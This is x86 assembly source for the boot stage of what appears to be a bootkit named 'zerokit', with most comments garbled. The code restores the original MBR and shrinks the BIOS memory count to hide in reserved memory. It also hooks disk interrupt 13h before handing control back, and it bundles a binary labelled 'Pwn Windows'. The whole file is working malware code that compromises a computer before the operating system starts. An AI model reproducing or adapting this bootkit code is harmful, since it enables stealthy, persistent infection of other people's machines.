org 200h                                                    ; � ������ 512 ������ ��������� ������������ MBR.

jmp l_bk_start
; ����� ��������� zerokit_header_t
zhdr_pack_size dd 0
zhdr_bk_size dd 0
zhdr_bk_payload32_size dd 0
zhdr_bk_payload64_size dd 0
zhdr_conf_size dd 0
zhdr_bundle_size dd 0

l_bk_start:
push cs
pop ds                                                     ; � ds ����� ��� ����� ������� ~ 3000h.
xor eax, eax
mov es, ax                                                 ; �������� es � ��������� ��������.

; Values Bootstrap loader is called with (IBM BIOS):
;       CS:IP = 0000h:7C00h
;       DH = access
;           bits 7-6,4-0: don't care
;           bit 5: =0 device supported by INT 13
;       DL = boot drive
;           00h first floppy
;           80h first hard disk

; 1. �������� ������������ ��������� �� ������ 0000h:7C00h.
; 2. �������� ���� ����� � ������� ������ � ���� �������� ����.
; 3. ������������� ���� ���������� ���������� 13h.
; 4. ������� ���������� �� ������������ MBR

xor si, si
mov di, 0x7C00
mov ecx, 128
rep movsd

mov si, 0x413                                                                   ; ������ ������� ������ � ���������� (BIOS Data Area (0040h:0013h))
                                                                                ; �� ������ 0x413 ��������� �����, � ������� ���������� ���������� ��������� ������ � �������� ������ 640 ��.
sub [es:si], word 8                                                             ; ����������� ��� ���� 8��.
es lodsw                                                                        ; 
shl ax, 6                                                                       ; * 1024 / 16
mov es, ax                                                                      ; ������� �������� �����.
xor di, di                                                                      ; �������� �������� �����.
mov si, 0x0E00                                                                  ; �������� ��������� ����� (�������� ��� ��������� windows.asm).
mov ecx, l_zbk_body_end - l_zbk_body_begin                                      ; ������ ���������� ������ � ������.
rep movsb                                                                       ; �������� ��� ��� � ���������� �����.

push word 0
pop ds

mov eax, [0x13 * 4]                                                             ; ��������� ������������ ���������� ����������.
mov [es:1], eax                                                                 ; ��������� ��� � �������� �������� ���������� jmp.
mov [0x13 * 4], word 6                                                          ; ������������� ���� ���������� (�������� �� hook_proc_int_13h � windows.asm).
mov [0x13 * 4 + 2], es

popad                                                                           ; ��������������� ����� ���������� ��������.
jmp 0x0000:0x7C00                                                               ; ������� ���������� ������������� ����������.

times 3072 - ($ - $$) db 0

; include Pwn Windows
l_zbk_body_begin:
file "..\bin\windows.bin"
l_zbk_body_end: